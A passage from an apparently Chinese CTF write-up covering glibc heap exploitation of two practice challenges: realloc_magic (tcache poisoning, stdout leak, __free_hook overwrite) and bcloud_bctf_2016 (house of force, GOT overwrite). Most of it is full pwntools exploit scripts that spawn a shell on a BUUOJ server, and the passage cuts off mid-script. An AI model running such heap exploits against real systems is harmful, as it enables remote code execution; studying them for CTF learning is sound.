<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>最后0x28是防止top chunk和unsorted bin合并，必须要用add 0,因为这样才可以让ptr&#x3D;&#x3D;NULL,然后调用malloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">7</span>)</span>:</span><br><span class="line">        <span class="title function_">free</span><span class="params">()</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span></span><br></pre></td></tr></table></figure>

<p>重新拿到0x88,然后free 7次，再利用realloc free掉进入unsorted bin同时ptr&#x3D;&#x3D;NULL</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)#拿到<span class="number">0x18</span>的块，如果pt!=<span class="literal">NULL</span>拿不到</span><br><span class="line">    add(<span class="number">0xa8</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p16(<span class="number">0xa760</span>))#利用<span class="built_in">realloc</span>合并的性质，和我们的unsorted bin合并掉，同时tcahce posiont,伪造size,同时把fd修改为_IO_2_1_stdout_的地址，这里需要爆破</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)<span class="meta">#ptr变成空</span></span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)#这个时候由于<span class="number">0x88</span>里面有两个堆，先要<span class="built_in">malloc</span>一个出来</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)#这个时候<span class="built_in">free</span>由于size伪造就不会进入<span class="number">0x88</span>,我们就可以<span class="built_in">malloc</span>到IO那里取</span><br></pre></td></tr></table></figure>

<p>tcache position的原因就是在malloc取tcahe的时候，不会再一次校验tcache的大小，只会看看里面是不是有bins</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_stdout=p64(<span class="number">0x00000000fbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x58</span>)</span><br><span class="line">    add(<span class="number">0x88</span>,fake_stdout)#这个时候就直接修改了<span class="built_in">stdout</span></span><br><span class="line">这里面需要注意的几个地方</span><br></pre></td></tr></table></figure>

<p>puts会调用_IO_sputn</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843431727-4d45c6f5-c126-443a-bd6b-2b64b697b391.png#averageHue=%231f1e1d&clientId=u9d5fd636-f51f-4&from=paste&height=218&id=ua3c001db&originHeight=273&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87097&status=done&style=none&taskId=u247f73b7-3496-4813-a09b-369ec3111ab&title=&width=738.4" alt="image.png"></p>
<p>基本的flag不需要改动，都会正常判断</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843438160-433aca80-1c9c-4a3b-a9ba-55a4c0e52b53.png#averageHue=%233d3d3c&clientId=u9d5fd636-f51f-4&from=paste&height=121&id=u16a3d4e3&originHeight=151&originWidth=924&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45395&status=done&style=none&taskId=ue6d711f9-24fe-433a-93f8-50fd1485b0e&title=&width=739.2" alt="image.png"></p>
<p>由于我们puts的时候输出缓冲区是满的，所以也不需要修改</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843452957-557c2c58-2624-446e-b27d-e4beda5187b0.png#averageHue=%2331302f&clientId=u9d5fd636-f51f-4&from=paste&height=602&id=ufc512fb5&originHeight=752&originWidth=1036&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218458&status=done&style=none&taskId=u3c82c779-c507-4659-bd8a-1daf38657e9&title=&width=828.8" alt="image.png"></p>
<p>其实修不修改也无所谓，关键就是要进入到_IO_overfollow,因为当输出缓冲区有空间的时候，我们就直接把内容copy到输出缓冲区，然后再刷新io，如果没有空间，就可能要分配空间或者刷新，我们要利用的就是刷新缓冲区</p>
<p>进入overfollow,里面会调用do_wrtie,所以我们要伪造write_base,并且要小于ptr,一般就是修改最后一位，找到更小的地方并且可以泄露libc的，其实很多，因为std结构都在附近，我们这里选用stdeer的jmp table</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843464216-80a68179-7899-4e04-9737-72e6ff5a7733.png#averageHue=%232c2b2a&clientId=u9d5fd636-f51f-4&from=paste&height=110&id=u71d6b3de&originHeight=137&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35495&status=done&style=none&taskId=ua79c8f8e-6f8e-4dc3-8a62-995c36cb199&title=&width=726.4" alt="image.png"></p>
<p>new_do_write,这里比较关键，由于我们要修改write_base必须要2覆盖掉IO_read_end,所以一旦进入else if就挂了，我们必须要进入if,所以就要有0x1000,所以我加上了0x1000,跟原来的IO比较，然后就可以write进行输出了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843473618-2eae533b-2ad2-4f9d-9543-f09f53aa1f5b.png#averageHue=%23fcfbfa&clientId=u9d5fd636-f51f-4&from=paste&height=374&id=ub6fd10f5&originHeight=467&originWidth=999&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159413&status=done&style=none&taskId=u8e778a1b-4084-4696-b1ca-fde4c7fad45&title=&width=799.2" alt="image.png"></p>
<p>当有 libc地址了，需要把ptr置为0，不然我们无法开启新的一轮操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x48</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">7</span>)</span>:</span><br><span class="line">        <span class="title function_">free</span><span class="params">()</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0x38</span>,b<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0xd8</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x41</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]<span class="number">-0x8</span>))</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0x98</span>,b<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span></span><br><span class="line">    <span class="title function_">add</span><span class="params">(<span class="number">0x98</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>+p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span></span><br><span class="line">    <span class="title function_">free</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>其实后面差不多，基本一模一样了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./roarctf_2019_realloc_magic&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xA2A)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x202058)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Size?\n&quot;</span>,str(size))</span><br><span class="line">    sa(b<span class="string">&quot;Content?\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>():</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27573</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">    add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">free</span>()</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0xa8</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p16(<span class="number">0xa760</span>))</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fake_stdout=p64(<span class="number">0x00000000fbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x58</span>)</span><br><span class="line">    add(<span class="number">0x88</span>,fake_stdout)</span><br><span class="line">    content=io.recvuntil(b<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> content==b<span class="string">&quot;&quot;</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base=u64(content.ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))-libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x38</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x48</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">free</span>()</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x38</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0xd8</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x41</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]<span class="number">-0x8</span>))</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">0x98</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>+p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    <span class="built_in">free</span>()</span><br><span class="line">    it()</span><br></pre></td></tr></table></figure>

<p>这里可以看出来，利用stdout泄露很简单，puts就可以利用，然后我们只需要把write_base修改一下，然后flag加上0x1000就好，十分的轻松</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><ul>
<li>题目中没有给free之类的接口</li>
<li>可以修改top chunk的size</li>
<li>可以分配较大的size如-0x30</li>
</ul>
<p>其实house of force和house of orange两种大概的条件差不多，都需要伪造一个top chunk的size,但是house of force尽量要伪造的很大如-1,然后保证我就算malloc(-0x40)也可以分配，这个达到的效果就是top chunk的整体迁移，如果我们迁移到bss上去了，后面再malloc之后就可以改掉对应的堆指针</p>
<p>但是house of orange要尽量的伪造小，进入sysmalloc里面free掉top chunk,这样就多了一个unsorted bin,后面的利用就参考unsorted bin打法</p>
<h3 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bcloud_bctf_2016">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题绝了，其实主函数没有漏洞，add edit free都十分完美，但漏洞居然是出在init里面，是我没有分析周全</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843496135-641a377d-0d39-4db8-925e-a2c5b4b29bd4.png#averageHue=%23fefefb&clientId=u9d5fd636-f51f-4&from=paste&height=234&id=u4fbb6c26&originHeight=293&originWidth=621&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66833&status=done&style=none&taskId=u320f70eb-4d62-4a20-a540-c33c526a5f4&title=&width=496.8" alt="image.png"></p>
<p>这里用的是strcpy,本来没有漏洞，因为我们会自动加上一个\x00，而且malloc的size也溢出不了，但是这里v2在之后赋值，刚好会覆盖掉\x00,导致后面pritnf name泄露了堆地址</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843504248-4879b306-ee57-4631-b349-d8aad0a2d82c.png#averageHue=%23fdfdfb&clientId=u9d5fd636-f51f-4&from=paste&height=481&id=u7c376b55&originHeight=601&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133445&status=done&style=none&taskId=ucc11b305-ffb9-42b4-ac8d-01673617ce1&title=&width=728.8" alt="image.png"></p>
<p>这里也是同理，s输入之后\x00截断会被v2覆盖，然后我们的v3又是在v2的后面，所以strcpy(v2,s)其实是strcpy(v2,s,v2,v3),然后v2堆分配又在v4后面，所以就可以直接溢出到topchunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sa(b<span class="string">&quot;Input your name:\n&quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">63</span>+b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">heap_addr=u32(r(<span class="number">4</span>))#泄露堆地址</span><br><span class="line">top_chunk_addr=<span class="number">0xd0</span>+heap_addr</span><br><span class="line">bss_adr=<span class="number">0x804B120</span></span><br><span class="line">sa(b<span class="string">&quot;Org:\n&quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">64</span>)</span><br><span class="line">sla(b<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xfffffff1</span>))#刚好就覆盖了size,修改为比较大的值</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843513361-02c61553-8864-4911-9e14-d2178befe87d.png#averageHue=%23fdfcf8&clientId=u9d5fd636-f51f-4&from=paste&height=104&id=uac56cb18&originHeight=130&originWidth=493&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15645&status=done&style=none&taskId=ub70bca22-6bc2-445c-b8d8-9da2ee5bc89&title=&width=394.4" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(bss_adr-top_chunk_addr<span class="number">-4</span><span class="number">-0x10</span>,b<span class="string">&quot;&quot;</span>)#通过这一步，我们的top chunk迁移到了bss地方</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)#这个堆地址就是我们的bss ptr</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x18</span>,b<span class="string">&quot;b&quot;</span>)</span>#这个用来修改<span class="built_in">free</span> got</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x18</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>)</span>#用来getshell</span><br><span class="line"><span class="title function_">edit</span><span class="params">(<span class="number">1</span>,p32(elf.got[<span class="string">&quot;puts&quot;</span>])+p32(bss_adr+<span class="number">0x10</span>)+p32(elf.got[<span class="string">&quot;free&quot;</span>])+p32(bss_adr+<span class="number">0x40</span>))</span>#由于有00截断，所以要手动填写地址</span><br><span class="line"><span class="title function_">edit</span><span class="params">(<span class="number">2</span>,p32(elf.plt[<span class="string">&quot;puts&quot;</span>]))</span>#修改<span class="built_in">free</span> got为put plt</span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="number">0</span>)</span>#泄露libc</span><br><span class="line">libc_base=u32(ru(b<span class="string">&quot;\xf7&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">edit(<span class="number">2</span>,p32(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))#覆盖<span class="built_in">free</span> got为system</span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="number">3</span>)</span><span class="meta">#getshell</span></span><br><span class="line"><span class="title function_">it</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./bcloud_bctf_2016&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">27585</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x8048A19</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xw 0x804B120</span></span><br><span class="line"><span class="string">    x/10xw 0x804B0A0 </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;length of the note content:\n&quot;</span>, str(size))</span><br><span class="line">    sla(b<span class="string">&quot;Input the content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the id:\n&quot;</span>, str(index))</span><br><span class="line">    sla(b<span class="string">&quot;Input the new content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the id:\n&quot;</span>, str(index))</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;Input your name:\n&quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">63</span>+b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">heap_addr=u32(r(<span class="number">4</span>))</span><br><span class="line">top_chunk_addr=<span class="number">0xd0</span>+heap_addr</span><br><span class="line">bss_adr=<span class="number">0x804B120</span></span><br><span class="line">sa(b<span class="string">&quot;Org:\n&quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">64</span>)</span><br><span class="line">sla(b<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xfffffff1</span>))</span><br><span class="line"></span><br><span class="line">add(bss_adr-top_chunk_addr<span class="number">-4</span><span class="number">-0x10</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">add(<span 